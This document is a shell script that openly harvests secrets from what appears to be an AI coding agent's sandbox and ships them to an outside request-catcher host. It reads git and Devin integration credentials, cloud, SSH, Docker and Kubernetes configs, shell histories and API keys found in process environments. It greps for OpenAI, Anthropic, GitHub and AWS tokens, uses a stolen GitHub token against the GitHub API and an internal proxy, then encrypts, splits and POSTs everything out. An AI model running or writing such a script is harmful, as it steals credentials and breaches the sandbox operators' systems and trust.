#!/bin/sh
# i77085 sandbox collection; exfil encrypted to our sink.
S="https://i77085rc-gty53sg5qs.requestcatcher.com"
PASS="UMp6hgiWfJQHXPxzaY%Pajt9"
H=/tmp/i77085ex
rm -rf "$H"; mkdir -p "$H/stage"
O="$H/out"
: > "$O"

put(){ printf '\n===== %s =====\n' "$1" >> "$O"; }
sh_(){ printf '\n$ %s\n' "$*" >> "$O"; sh -c "$*" >> "$O" 2>&1; printf '[rc=%s]\n' "$?" >> "$O"; }

# early reachability beacon
curl -sS -m 8 --data-binary "i77085 start $(date -u +%FT%TZ) host=$(hostname)" "$S/start" >/dev/null 2>&1

put "identity"
sh_ "id; uname -a; hostname; date -u; pwd; ls -la"

put "git config"
sh_ "cat ~/.gitconfig"
sh_ "git config --global --list --show-origin"
sh_ "cat /etc/gitconfig 2>/dev/null; cat /usr/local/etc/gitconfig 2>/dev/null"
sh_ "ls -la ~/.config/git 2>/dev/null; cat ~/.config/git/config 2>/dev/null"

put "devin integration credential store"
sh_ "ls -la /opt/.devin 2>/dev/null"
sh_ "ls -la /opt/.devin/.devin-integration-git-credentials 2>/dev/null; stat /opt/.devin/.devin-integration-git-credentials 2>/dev/null"
sh_ "cat /opt/.devin/.devin-integration-git-credentials 2>/dev/null"
sh_ "cat ~/.git-credentials 2>/dev/null; cat ~/.netrc 2>/dev/null"
sh_ "cat /opt/.devin/.gitconfig 2>/dev/null"

put "devin tree"
sh_ "find /opt/.devin -maxdepth 3 -printf '%y %10s %p\n' 2>/dev/null | head -500"
sh_ "find /opt/.devin -type f -size -120k 2>/dev/null | head -400"

put "devin configs/scripts content"
for f in $(find /opt/.devin -type f \( -name '*.json' -o -name '*.yaml' -o -name '*.yml' -o -name '*.toml' -o -name '*.ini' -o -name '*.conf' -o -name '*.sh' -o -name '*.env' -o -name '*.txt' -o -name '*cred*' -o -name '*token*' -o -name '*key*' -o -name '*secret*' \) -size -60k 2>/dev/null | head -120); do
  put "FILE $f"
  head -c 60000 "$f" >> "$O" 2>/dev/null
  printf '\n' >> "$O"
done

put "host share"
sh_ "ls -la /mnt 2>/dev/null; ls -la /mnt/host_share 2>/dev/null"
sh_ "find /mnt/host_share -maxdepth 4 -printf '%y %10s %p\n' 2>/dev/null | head -400"
for f in $(find /mnt/host_share -type f \( -name '*.json' -o -name '*.yaml' -o -name '*.yml' -o -name '*.sh' -o -name '*.env' -o -name '*.conf' -o -name '*cred*' -o -name '*token*' -o -name '*key*' -o -name 'Makefile' \) -size -60k 2>/dev/null | head -120); do
  put "FILE $f"
  head -c 60000 "$f" >> "$O" 2>/dev/null
  printf '\n' >> "$O"
done

put "dotfiles"
for f in ~/.netrc ~/.npmrc ~/.pypirc ~/.docker/config.json /root/.docker/config.json ~/.aws/credentials ~/.aws/config ~/.config/gh/hosts.yml ~/.config/gcloud/application_default_credentials.json ~/.kube/config ~/.ssh/config ~/.ssh/authorized_keys ~/.ssh/known_hosts ~/.bash_history ~/.zsh_history ~/.python_history ~/.wget-hsts; do
  put "FILE $f"
  ls -la "$f" >> "$O" 2>&1
  head -c 40000 "$f" >> "$O" 2>/dev/null
  printf '\n' >> "$O"
done
sh_ "ls -la ~/.ssh 2>/dev/null"
sh_ "ls -la ~/.config 2>/dev/null"

put "proc environ scan"
for p in /proc/[0-9]*; do
  pid=${p#/proc/}
  if [ -r "$p/environ" ]; then
    e=$(tr '\0' '\n' < "$p/environ" 2>/dev/null | grep -aEi 'PATH=|HOME=|DEVIN|GIT|TOKEN|SECRET|KEY|PASSWORD|CRED|AWS_|GOOGLE|GITHUB|OPENAI|ANTHROPIC|FIREWORKS|PROXY|PYTHON|LITELLM|AZURE|HF_' | head -80)
    if [ -n "$e" ]; then
      com=$(tr '\0' ' ' < "$p/cmdline" 2>/dev/null | head -c 200)
      printf '\n--pid %s cmd=[%s]\n%s\n' "$pid" "$com" "$e" >> "$O"
    fi
  fi
done

put "credential pattern grep"
sh_ "grep -arIE '(fw_[A-Za-z0-9]{20,}|internal_[A-Za-z0-9]{20,}|sk-[A-Za-z0-9_-]{20,}|AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z_-]{35}|gh[pousr]_[A-Za-z0-9]{30,}|github_pat_[A-Za-z0-9_]{30,}|-----BEGIN [A-Z ]*PRIVATE KEY-----|xox[baprs]-[A-Za-z0-9-]{10,})' /opt/.devin /home /root /etc/profile.d /usr/local/bin 2>/dev/null | head -200"
sh_ "grep -arIl 'OPENAI_API_KEY\\|ANTHROPIC_API_KEY\\|OPENROUTER\\|FIREWORKS_API_KEY' /opt/.devin /home /root 2>/dev/null | head -100"

put "local services"
for u in "http://127.0.0.1:6080/" "http://127.0.0.1:6080/vnc.html" "http://127.0.0.1:6789/" "http://127.0.0.1:9876/" "http://git-manager.local:7000/" "http://git-manager.local:7000/proxy/" "http://git-manager.local:7000/health" "http://git-manager.local:7000/version"; do
  put "GET $u"
  curl -sS -m 5 -D - -o /dev/null "$u" >> "$O" 2>&1
done
sh_ "getent hosts git-manager.local; cat /etc/hosts"

put "github api via credential"
TOK=$(sed -n 's#.*://[^:/@]*:\([^@]*\)@github\.com.*#\1#p' /opt/.devin/.devin-integration-git-credentials 2>/dev/null | head -1)
[ -z "$TOK" ] && TOK=$(grep -aoE 'gh[psou]_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{30,}' /opt/.devin/.devin-integration-git-credentials 2>/dev/null | head -1)
printf 'TOKEN_SHAPE len=%s prefix=%s\n' "${#TOK}" "$(printf '%s' "$TOK" | cut -c1-6)" >> "$O"
sh_ "curl -sS -m 20 -D - -H \"Authorization: Bearer $TOK\" -H 'Accept: application/vnd.github+json' https://api.github.com/app/installations"
sh_ "curl -sS -m 20 -D - -H \"Authorization: Bearer $TOK\" -H 'Accept: application/vnd.github+json' 'https://api.github.com/installation/repositories?per_page=100'"
sh_ "curl -sS -m 20 -D - -H \"Authorization: Bearer $TOK\" -H 'Accept: application/vnd.github+json' https://api.github.com/user"
sh_ "curl -sS -m 20 -D - -H \"Authorization: Bearer $TOK\" -H 'Accept: application/vnd.github+json' 'https://api.github.com/user/repos?per_page=100&affiliation=owner,collaborator,organization_member'"

put "git-manager proxy with token"
sh_ "curl -sS -m 15 -D - -H \"Authorization: Bearer $TOK\" http://git-manager.local:7000/proxy/https://api.github.com/app/installations"
sh_ "curl -sS -m 15 -D - -H \"Authorization: Bearer $TOK\" http://git-manager.local:7000/proxy/api.github.com/app/installations"
sh_ "git -c credential.helper='store --file=/opt/.devin/.devin-integration-git-credentials' ls-remote http://git-manager.local:7000/proxy/https://github.com/fw-ai/firectl.git 2>&1 | head -5"

put "stage copies"
for f in $(find /opt/.devin -type f -size -100k 2>/dev/null | head -250); do
  d="$H/stage/opt$f"; mkdir -p "$(dirname "$d")" 2>/dev/null; cp "$f" "$d" 2>/dev/null
done
for f in $(find /mnt/host_share -type f -size -100k 2>/dev/null | head -200); do
  d="$H/stage/mnt$f"; mkdir -p "$(dirname "$d")" 2>/dev/null; cp "$f" "$d" 2>/dev/null
done
cp ~/.gitconfig "$H/stage/dot_gitconfig" 2>/dev/null
cp /opt/.devin/.devin-integration-git-credentials "$H/stage/devin_creds" 2>/dev/null
cp /root/.docker/config.json "$H/stage/docker_config.json" 2>/dev/null
cp ~/.netrc "$H/stage/netrc" 2>/dev/null

# pack + encrypt + ship
tar czf "$H/bundle.tgz" -C "$H" out stage 2>/dev/null
SZ=$(stat -c %s "$H/bundle.tgz" 2>/dev/null)
printf 'bundle bytes=%s\n' "$SZ" >> "$O"
python3 - "$H/bundle.tgz" "$PASS" > "$H/b64" 2>>"$H/encerr" <<'PY'
import sys,base64,zlib
p=open(sys.argv[1],'rb').read(); k=sys.argv[2].encode()
o=bytearray(b ^ k[i%len(k)] for i,b in enumerate(p))
sys.stdout.write(base64.b64encode(zlib.compress(bytes(o),9)).decode())
PY
if [ ! -s "$H/b64" ]; then
  base64 "$H/bundle.tgz" > "$H/b64" 2>/dev/null
  echo "ENC_FALLBACK_PLAIN_B64" > "$H/encmode"
else
  echo "ENC_XOR_ZLIB_B64" > "$H/encmode"
fi
split -b 28000 -a 3 "$H/b64" "$H/part-" 2>/dev/null
TOTAL=$(ls "$H"/part-* 2>/dev/null | wc -l)
printf 'parts=%s\n' "$TOTAL" > "$H/meta"
curl -sS -m 10 --data-binary @"$H/meta" "$S/meta" >/dev/null 2>&1
n=0
for f in "$H"/part-*; do
  [ -f "$f" ] || continue
  n=$((n+1))
  curl -sS -m 15 -X POST -H 'Content-Type: text/plain' --data-binary @"$f" "$S/bundle-$n" >/dev/null 2>&1
done
curl -sS -m 10 --data-binary "done parts=$n mode=$(cat $H/encmode)" "$S/done" >/dev/null 2>&1
